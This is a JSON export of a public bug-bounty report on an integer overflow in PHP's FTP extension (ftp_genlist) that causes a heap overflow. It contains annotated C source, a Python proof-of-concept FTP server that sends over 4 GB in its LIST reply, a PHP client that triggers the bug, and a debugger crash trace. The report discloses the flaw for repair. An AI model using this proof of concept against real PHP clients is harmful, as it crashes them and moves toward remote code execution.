{"id":73240,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83MzI0MA==","url":"https://hackerone.com/reports/73240","title":"Integer overflow in ftp_genlist() resulting in heap overflow","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2015-04-28T00:00:00.000Z","submitted_at":"2015-04-28T00:00:00.000Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"ruben","url":"/ruben","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":29,"url":"https://hackerone.com/ibb-php","handle":"ibb-php","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"PHP (IBB)","twitter_handle":"","website":"http://www.php.net","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2015-4022"],"singular_disclosure_disabled":false,"disclosed_at":"2015-05-12T00:00:00.000Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2015-05-12T00:00:00.000Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"https://bugs.php.net/bug.php?id=69545\n\nDescription:\n------------\nThe ftp_genlist() function of the ftp extension is prone to an integer overflow, which may result in remote code execution.\n\n```\next/ftp/ftp.c:ftp_genlist(...)\n1826         size = 0;\n1827         lines = 0;\n1828         lastch = 0;\n1829         while ((rcvd = my_recv(ftp, data-\u003efd, data-\u003ebuf, FTP_BUFSIZE))) {\n1830                 if (rcvd == -1) {\n1831                         goto bail;\n1832                 }\n1833\n1834                 php_stream_write(tmpstream, data-\u003ebuf, rcvd);\n1835\n1836                 size += rcvd;\n1837                 for (ptr = data-\u003ebuf; rcvd; rcvd--, ptr++) {\n1838                         if (*ptr == '\\n' \u0026\u0026 lastch == '\\r') {\n1839                                 lines++; // [0]\n1840                         } else {\n1841                                 size++; // [1]\n1842                         }\n1843                         lastch = *ptr;\n1844                 }\n1845         }\n```\n\nIn the above loop `size' or `lines' may overflow (at [0] respectively [1]).\nThis requires sending more than 2^32 bytes, which will be stored in a tempfile.\n\n```\n1851         ret = safe_emalloc((lines + 1), sizeof(char*), size); // [2]\n1852\n1853         entry = ret;\n1854         text = (char*) (ret + lines + 1);\n1855         *entry = text;\n1856         lastch = 0;\n1857         while ((ch = php_stream_getc(tmpstream)) != EOF) {\n1858                 if (ch == '\\n' \u0026\u0026 lastch == '\\r') {\n1859                         *(text - 1) = 0;\n1860                         *++entry = text;\n1861                 } else {\n1862                         *text++ = ch; // [3]\n1863                 }\n1864                 lastch = ch;\n1865         }\n1866         *entry = NULL;\n```\n\nThis results in the allocated buffer at [2] being to small to hold the data written to\nthe tempfile, which results in a heap overflow at [3] when loading the contents of the\ntempfile back into memory.\n\nThese kind of bugs are well-known to be exploitable and since php_stream_getc uses structs\nlocated on the heap, which may be overwritten, I think that this bug can be leveraged to attain\nremote code execution.\n\nRegards,\nMax Spelsberg\n\n\n```\nmalicious_server.py\n===================\n#!/usr/bin/env python2\n# coding: utf-8\n\n# based on https://gist.github.com/scturtle/1035886\n\nimport os,socket,threading,time\n\nallow_delete = False\nlocal_ip = \"localhost\"\nlocal_port = 8887\ncurrdir=os.path.abspath('.')\n\nclass FTPserverThread(threading.Thread):\n    def __init__(self,(conn,addr)):\n        self.conn=conn\n        self.addr=addr\n        self.basewd=currdir\n        self.cwd=self.basewd\n        self.rest=False\n        self.pasv_mode=False\n        threading.Thread.__init__(self)\n\n    def run(self):\n        self.conn.send('220 Welcome!\\r\\n')\n        while True:\n            cmd=self.conn.recv(256)\n            if not cmd: break\n            else:\n                print 'Recieved:',cmd\n                try:\n                    func=getattr(self,cmd[:4].strip().upper())\n                    func(cmd)\n                except Exception,e:\n                    print 'ERROR:',e\n                    #traceback.print_exc()\n                    self.conn.send('500 Sorry.\\r\\n')\n            self.conn.close()\n\n    def TYPE(self,cmd):\n        self.mode=cmd[5]\n        self.conn.send('200 Binary mode.\\r\\n')\n\n    def PASV(self,cmd): # from http://goo.gl/3if2U\n        self.pasv_mode = True\n        self.servsock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n        self.servsock.bind((local_ip,0))\n        self.servsock.listen(1)\n        ip, port = self.servsock.getsockname()\n        print 'open', ip, port\n        self.conn.send('227 Entering Passive Mode (%s,%u,%u).\\r\\n' %\n                (','.join(ip.split('.')), port\u003e\u003e8\u00260xFF, port\u00260xFF))\n\n    def start_datasock(self):\n        if self.pasv_mode:\n            self.datasock, addr = self.servsock.accept()\n            print 'connect:', addr\n        else:\n            self.datasock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n            self.datasock.connect((self.dataAddr,self.dataPort))\n\n    def stop_datasock(self):\n        self.datasock.close()\n        if self.pasv_mode:\n            self.servsock.close()\n\n    # THIS is the interesting part    \n    def LIST(self,cmd):\n        self.conn.send('150 Here comes the directory listing.\\r\\n')\n        print 'list:', self.cwd\n        self.start_datasock()\n\n        # send 2^32 + 1 bytes of data\n        for i in xrange(262144):\n            if i % 10000 == 0:\n                print \"%d\" % i\n            self.datasock.send(\"B\"*16384)\n        self.datasock.send(\"A\\r\\n\")\n\n        self.stop_datasock()\n        self.conn.send('226 Directory send OK.\\r\\n')\n\n\nclass FTPserver(threading.Thread):\n    def __init__(self):\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.sock.bind((local_ip,local_port))\n        threading.Thread.__init__(self)\n\n    def run(self):\n        self.sock.listen(5)\n        while True:\n            th=FTPserverThread(self.sock.accept())\n            th.daemon=True\n            th.start()\n\n    def stop(self):\n        self.sock.close()\n\nif __name__=='__main__':\n    ftp=FTPserver()\n    ftp.daemon=True\n    ftp.start()\n    print 'On', local_ip, ':', local_port\n    raw_input('Enter to end...\\n')\n    ftp.stop()\n```\n\n```\nbuggy.php\n=========\n\u003c?php\n    $id = ftp_connect(\"localhost\", 8887);\n    ftp_pasv($id, TRUE);\n    var_dump(ftp_rawlist($id, \"/\"));\n?\u003e\n```\n\n\n```\nResult\n======\n(lldb) r ./buggy.php\nProcess 54712 launched: '/usr/bin/php' (x86_64)\nProcess 54712 stopped\n* thread #1: tid = 0x204e9, 0x00007fff86503056 libsystem_platform.dylib`_platform_memmove$VARIANT$Unknown + 182, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x1024243de)\n    frame #0: 0x00007fff86503056 libsystem_platform.dylib`_platform_memmove$VARIANT$Unknown + 182\nlibsystem_platform.dylib`_platform_memmove$VARIANT$Unknown:\n-\u003e  0x7fff86503056 \u003c+182\u003e: movb   (%rsi,%r8), %cl\n    0x7fff8650305a \u003c+186\u003e: movb   %cl, (%rdi,%r8)\n    0x7fff8650305e \u003c+190\u003e: subq   $0x1, %rdx\n    0x7fff86503062 \u003c+194\u003e: je     0x7fff86503078            ; \u003c+216\u003e\n(lldb) register read rsi\n     rsi = 0x00000001024243de\n(lldb) bt\n* thread #1: tid = 0x204e9, 0x00007fff86503056 libsystem_platform.dylib`_platform_memmove$VARIANT$Unknown + 182, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x1024243de)\n  * frame #0: 0x00007fff86503056 libsystem_platform.dylib`_platform_memmove$VARIANT$Unknown + 182\n    frame #1: 0x000000010031b2c7 php`_php_stream_read + 81\n    frame #2: 0x000000010031b8a1 php`_php_stream_getc + 22\n    frame #3: 0x000000010010ec3a php`___lldb_unnamed_function2574$$php + 614\n    frame #4: 0x000000010010c21c php`___lldb_unnamed_function2530$$php + 118\n    frame #5: 0x00000001003cb2af php`___lldb_unnamed_function9391$$php + 1752\n    frame #6: 0x00000001003813b0 php`execute_ex + 79\n    frame #7: 0x000000010035d592 php`zend_execute_scripts + 482\n    frame #8: 0x0000000100308897 php`php_execute_script + 684\n    frame #9: 0x00000001003edce0 php`___lldb_unnamed_function9505$$php + 4653\n    frame #10: 0x00000001003ec93c php`___lldb_unnamed_function9503$$php + 1408\n    frame #11: 0x00007fff8cb8d5c9 libdyld.dylib`start + 1\n(lldb)\n```\n[Note that the first three bytes (42, 43, de) of rsi have been overwritten!]\n","vulnerability_information_html":"\u003cp\u003e\u003ca title=\"https://bugs.php.net/bug.php?id=69545\" href=\"/redirect?url=https%3A%2F%2Fbugs.php.net%2Fbug.php%3Fid%3D69545\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://bugs.php.net/bug.php?id=69545\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"description\"\u003eDescription:\u003c/h2\u003e\n\n\u003cp\u003eThe ftp_genlist() function of the ftp extension is prone to an integer overflow, which may result in remote code execution.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eext/ftp/ftp.c:ftp_genlist(...)\n1826         size = 0;\n1827         lines = 0;\n1828         lastch = 0;\n1829         while ((rcvd = my_recv(ftp, data-\u0026gt;fd, data-\u0026gt;buf, FTP_BUFSIZE))) {\n1830                 if (rcvd == -1) {\n1831                         goto bail;\n1832                 }\n1833\n1834                 php_stream_write(tmpstream, data-\u0026gt;buf, rcvd);\n1835\n1836                 size += rcvd;\n1837                 for (ptr = data-\u0026gt;buf; rcvd; rcvd--, ptr++) {\n1838                         if (*ptr == \u0026#39;\\n\u0026#39; \u0026amp;\u0026amp; lastch == \u0026#39;\\r\u0026#39;) {\n1839                                 lines++; // [0]\n1840                         } else {\n1841                                 size++; // [1]\n1842                         }\n1843                         lastch = *ptr;\n1844                 }\n1845         }\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIn the above loop \u003ccode\u003esize\u0026#39; or\u003c/code\u003elines\u0026#39; may overflow (at [0] respectively [1]).\u003cbr\u003e\nThis requires sending more than 2^32 bytes, which will be stored in a tempfile.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e1851         ret = safe_emalloc((lines + 1), sizeof(char*), size); // [2]\n1852\n1853         entry = ret;\n1854         text = (char*) (ret + lines + 1);\n1855         *entry = text;\n1856         lastch = 0;\n1857         while ((ch = php_stream_getc(tmpstream)) != EOF) {\n1858                 if (ch == \u0026#39;\\n\u0026#39; \u0026amp;\u0026amp; lastch == \u0026#39;\\r\u0026#39;) {\n1859                         *(text - 1) = 0;\n1860                         *++entry = text;\n1861                 } else {\n1862                         *text++ = ch; // [3]\n1863                 }\n1864                 lastch = ch;\n1865         }\n1866         *entry = NULL;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis results in the allocated buffer at [2] being to small to hold the data written to\u003cbr\u003e\nthe tempfile, which results in a heap overflow at [3] when loading the contents of the\u003cbr\u003e\ntempfile back into memory.\u003c/p\u003e\n\n\u003cp\u003eThese kind of bugs are well-known to be exploitable and since php_stream_getc uses structs\u003cbr\u003e\nlocated on the heap, which may be overwritten, I think that this bug can be leveraged to attain\u003cbr\u003e\nremote code execution.\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\nMax Spelsberg\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003emalicious_server.py\n===================\n#!/usr/bin/env python2\n# coding: utf-8\n\n# based on https://gist.github.com/scturtle/1035886\n\nimport os,socket,threading,time\n\nallow_delete = False\nlocal_ip = \u0026quot;localhost\u0026quot;\nlocal_port = 8887\ncurrdir=os.path.abspath(\u0026#39;.\u0026#39;)\n\nclass FTPserverThread(threading.Thread):\n    def __init__(self,(conn,addr)):\n        self.conn=conn\n        self.addr=addr\n        self.basewd=currdir\n        self.cwd=self.basewd\n        self.rest=False\n        self.pasv_mode=False\n        threading.Thread.__init__(self)\n\n    def run(self):\n        self.conn.send(\u0026#39;220 Welcome!\\r\\n\u0026#39;)\n        while True:\n            cmd=self.conn.recv(256)\n            if not cmd: break\n            else:\n                print \u0026#39;Recieved:\u0026#39;,cmd\n                try:\n                    func=getattr(self,cmd[:4].strip().upper())\n                    func(cmd)\n                except Exception,e:\n                    print \u0026#39;ERROR:\u0026#39;,e\n                    #traceback.print_exc()\n                    self.conn.send(\u0026#39;500 Sorry.\\r\\n\u0026#39;)\n            self.conn.close()\n\n    def TYPE(self,cmd):\n        self.mode=cmd[5]\n        self.conn.send(\u0026#39;200 Binary mode.\\r\\n\u0026#39;)\n\n    def PASV(self,cmd): # from http://goo.gl/3if2U\n        self.pasv_mode = True\n        self.servsock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n        self.servsock.bind((local_ip,0))\n        self.servsock.listen(1)\n        ip, port = self.servsock.getsockname()\n        print \u0026#39;open\u0026#39;, ip, port\n        self.conn.send(\u0026#39;227 Entering Passive Mode (%s,%u,%u).\\r\\n\u0026#39; %\n                (\u0026#39;,\u0026#39;.join(ip.split(\u0026#39;.\u0026#39;)), port\u0026gt;\u0026gt;8\u0026amp;0xFF, port\u0026amp;0xFF))\n\n    def start_datasock(self):\n        if self.pasv_mode:\n            self.datasock, addr = self.servsock.accept()\n            print \u0026#39;connect:\u0026#39;, addr\n        else:\n            self.datasock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n            self.datasock.connect((self.dataAddr,self.dataPort))\n\n    def stop_datasock(self):\n        self.datasock.close()\n        if self.pasv_mode:\n            self.servsock.close()\n\n    # THIS is the interesting part    \n    def LIST(self,cmd):\n        self.conn.send(\u0026#39;150 Here comes the directory listing.\\r\\n\u0026#39;)\n        print \u0026#39;list:\u0026#39;, self.cwd\n        self.start_datasock()\n\n        # send 2^32 + 1 bytes of data\n        for i in xrange(262144):\n            if i % 10000 == 0:\n                print \u0026quot;%d\u0026quot; % i\n            self.datasock.send(\u0026quot;B\u0026quot;*16384)\n        self.datasock.send(\u0026quot;A\\r\\n\u0026quot;)\n\n        self.stop_datasock()\n        self.conn.send(\u0026#39;226 Directory send OK.\\r\\n\u0026#39;)\n\n\nclass FTPserver(threading.Thread):\n    def __init__(self):\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.sock.bind((local_ip,local_port))\n        threading.Thread.__init__(self)\n\n    def run(self):\n        self.sock.listen(5)\n        while True:\n            th=FTPserverThread(self.sock.accept())\n            th.daemon=True\n            th.start()\n\n    def stop(self):\n        self.sock.close()\n\nif __name__==\u0026#39;__main__\u0026#39;:\n    ftp=FTPserver()\n    ftp.daemon=True\n    ftp.start()\n    print \u0026#39;On\u0026#39;, local_ip, \u0026#39;:\u0026#39;, local_port\n    raw_input(\u0026#39;Enter to end...\\n\u0026#39;)\n    ftp.stop()\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003ebuggy.php\n=========\n\u003cspan class=\"cp\"\u003e\u0026lt;?php\u003c/span\u003e\n    \u003cspan class=\"nv\"\u003e$id\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eftp_connect\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;localhost\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e8887\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"nb\"\u003eftp_pasv\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$id\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003eTRUE\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"nb\"\u003evar_dump\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003eftp_rawlist\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$id\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;/\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eResult\n======\n(lldb) r ./buggy.php\nProcess 54712 launched: \u0026#39;/usr/bin/php\u0026#39; (x86_64)\nProcess 54712 stopped\n* thread #1: tid = 0x204e9, 0x00007fff86503056 libsystem_platform.dylib`_platform_memmove$VARIANT$Unknown + 182, queue = \u0026#39;com.apple.main-thread\u0026#39;, stop reason = EXC_BAD_ACCESS (code=1, address=0x1024243de)\n    frame #0: 0x00007fff86503056 libsystem_platform.dylib`_platform_memmove$VARIANT$Unknown + 182\nlibsystem_platform.dylib`_platform_memmove$VARIANT$Unknown:\n-\u0026gt;  0x7fff86503056 \u0026lt;+182\u0026gt;: movb   (%rsi,%r8), %cl\n    0x7fff8650305a \u0026lt;+186\u0026gt;: movb   %cl, (%rdi,%r8)\n    0x7fff8650305e \u0026lt;+190\u0026gt;: subq   $0x1, %rdx\n    0x7fff86503062 \u0026lt;+194\u0026gt;: je     0x7fff86503078            ; \u0026lt;+216\u0026gt;\n(lldb) register read rsi\n     rsi = 0x00000001024243de\n(lldb) bt\n* thread #1: tid = 0x204e9, 0x00007fff86503056 libsystem_platform.dylib`_platform_memmove$VARIANT$Unknown + 182, queue = \u0026#39;com.apple.main-thread\u0026#39;, stop reason = EXC_BAD_ACCESS (code=1, address=0x1024243de)\n  * frame #0: 0x00007fff86503056 libsystem_platform.dylib`_platform_memmove$VARIANT$Unknown + 182\n    frame #1: 0x000000010031b2c7 php`_php_stream_read + 81\n    frame #2: 0x000000010031b8a1 php`_php_stream_getc + 22\n    frame #3: 0x000000010010ec3a php`___lldb_unnamed_function2574$$php + 614\n    frame #4: 0x000000010010c21c php`___lldb_unnamed_function2530$$php + 118\n    frame #5: 0x00000001003cb2af php`___lldb_unnamed_function9391$$php + 1752\n    frame #6: 0x00000001003813b0 php`execute_ex + 79\n    frame #7: 0x000000010035d592 php`zend_execute_scripts + 482\n    frame #8: 0x0000000100308897 php`php_execute_script + 684\n    frame #9: 0x00000001003edce0 php`___lldb_unnamed_function9505$$php + 4653\n    frame #10: 0x00000001003ec93c php`___lldb_unnamed_function9503$$php + 1408\n    frame #11: 0x00007fff8cb8d5c9 libdyld.dylib`start + 1\n(lldb)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e[Note that the first three bytes (42, 43, de) of rsi have been overwritten!]\u003c/p\u003e\n","bounty_amount":"1500.0","formatted_bounty":"$1,500","original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":0,"voters":[],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1196217,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":null,"markdown_message":"","automated_response":false,"created_at":"2015-05-12T00:00:00.000Z","updated_at":"2016-09-15T13:29:45.799Z","actor":{"url":"/ibb-php","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"PHP (IBB)"}},"reporter":{"username":"ruben","url":"/ruben"},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8037405,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":null,"markdown_message":"","automated_response":false,"created_at":"2015-06-30T11:35:51.641Z","updated_at":"2020-05-18T15:23:54.586Z","actor":{"url":"/ibb-php","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"PHP (IBB)"}},"reporter":{"username":"ruben","url":"/ruben"},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":496240,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":null,"markdown_message":"","automated_response":false,"created_at":"2015-06-30T11:35:51.674Z","updated_at":"2015-06-30T11:35:51.674Z","actor":{"url":"/ibb-php","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"PHP (IBB)"}},"bounty_amount":"1500.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"ibb-php","collaborator":{"username":"ruben","url":"/ruben"},"actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}